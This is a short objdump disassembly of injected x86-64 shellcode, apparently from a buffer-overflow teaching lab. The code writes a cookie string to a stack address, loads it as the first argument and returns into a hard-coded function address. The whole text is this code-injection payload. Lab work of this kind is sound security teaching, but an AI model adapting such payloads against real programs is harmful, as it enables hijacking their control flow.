
3assemble.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	49 c7 c0 00 d0 61 55 	mov    $0x5561d000,%r8
   7:	4d 89 c2             	mov    %r8,%r10
   a:	49 b9 35 39 62 39 39 	movabs $0x6166373939623935,%r9
  11:	37 66 61 
  14:	4d 89 08             	mov    %r9,(%r8)
  17:	49 83 c0 09          	add    $0x9,%r8
  1b:	41 c6 00 00          	movb   $0x0,(%r8)
  1f:	4c 89 d7             	mov    %r10,%rdi
  22:	68 fa 18 40 00       	pushq  $0x4018fa
  27:	c3                   	retq   
